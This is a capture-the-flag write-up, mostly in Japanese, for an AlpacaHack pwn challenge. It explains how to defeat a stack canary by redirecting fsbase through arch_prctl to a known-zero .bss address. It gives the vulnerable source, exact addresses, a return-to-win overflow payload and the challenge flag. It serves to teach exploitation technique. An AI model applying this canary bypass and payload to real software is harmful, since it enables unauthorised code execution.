# [pwn] fsbase modification

> カナリアは `fs:0x28` から読まれる。fsbase を攻撃者が設定できるなら、カナリア値を既知化できる。

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | pwn |
| Difficulty | ★★★★☆ (Hard) |
| Date | 2026-11-03 |
| Released | 2026-10-09 |
| Flag | `Alpaca{Also_we_can_use_the_WRFSBASE_instruction_to_set_the_FS_base_address}` |

## Problem Statement

> The vuln function has a stack buffer overflow vulnerability. But even if a
> return address is modified, the program will terminate abnormally because a
> stack canary exists. However, this challenge it seems we can modify something
> called fsbase before the vuln function is called.

配布物: `chal`(ELF, **no-PIE**), `chal.c`, `Dockerfile`, `compose.yaml`。

```c
void win(void){ execve("/bin/cat",{"/bin/cat","/flag.txt",0},0); }
void vuln(void){ char buf[8]={0}; write(1,"...",24); read(0,buf,32); }   // overflow
int main(void){
    char buf[32]; read(0,buf,31);
    unsigned long fsbase = strtoul(buf,0,10);
    syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);   // fsbase を任意設定
    vuln();
}
```

## TL;DR

- `vuln` は `buf[8]` に 32 バイト read → BOF。だがスタックカナリアあり。
- カナリアはコンパイラが `mov rax, fs:0x28` で読む＝**fsbase+0x28** の値。
- `main` が `arch_prctl(ARCH_SET_FS, fsbase)` で fsbase を任意設定できる。
- no-PIE なので `.bss`(0x404038) は固定でゼロ8バイト。`fsbase = 0x404038 - 0x28 =
  0x404010` にすると `fs:0x28 = *0x404038 = 0`。**カナリア = 0 と確定**。
- オーバーフローでカナリア欄に 0 を置き、戻りアドレスを `win`(0x4011b6) に。

## Background Knowledge

### スタックカナリアと fsbase

x86-64 Linux では TLS が `fs` セグメントに置かれ、スタックカナリアは TLS の
`fs:0x28` に格納される。関数頭で `mov rax, fs:0x28; mov [rbp-8], rax`、関数末で
比較する。`fs` のベース(fsbase)は通常スレッド生成時に設定され固定だが、本問は
`arch_prctl(ARCH_SET_FS, ...)` を攻撃者入力で呼ぶため、**カナリアの参照先ごと
すり替えられる**。参照先を中身既知(=0)の領域に向ければカナリアを無力化できる。

### スタック配置（vuln）

```
[rbp-0x10] buf[8]
[rbp-0x08] canary
[rbp+0x00] saved rbp
[rbp+0x08] return address
```
read は 32 バイト＝ちょうど buf+canary+rbp+ret を全て上書きできる。

## Solution

```
fsbase 入力:  4210704            # = 0x404010, fs:0x28 -> *.bss == 0
payload:      b"A"*8 + p64(0) + p64(0x404038) + p64(0x4011b6)
              # buf  + canary=0 + rbp(任意) + ret=win
```

`win` が `/bin/cat /flag.txt` を execve。実装は `solve.py`（標準 socket のみ）。

フラグ自身が示すように、ユーザ空間から直接 `WRFSBASE` 命令で fsbase を書ける
CPU(FSGSBASE 有効時)もあり、本質的に同じ攻撃面。

## Lessons Learned

- スタックカナリアの信頼性は「`fs:0x28` の中身が秘密であること」に依存する。
  fsbase を攻撃者が操作できると、カナリア方式は根本から崩れる。
- no-PIE + 既知ゼロ領域(.bss)の組み合わせで、leak 無しにカナリアを確定できた。

## Tags

`pwn` `stack-canary` `fsbase` `arch_prctl` `bof` `no-pie` `tls`
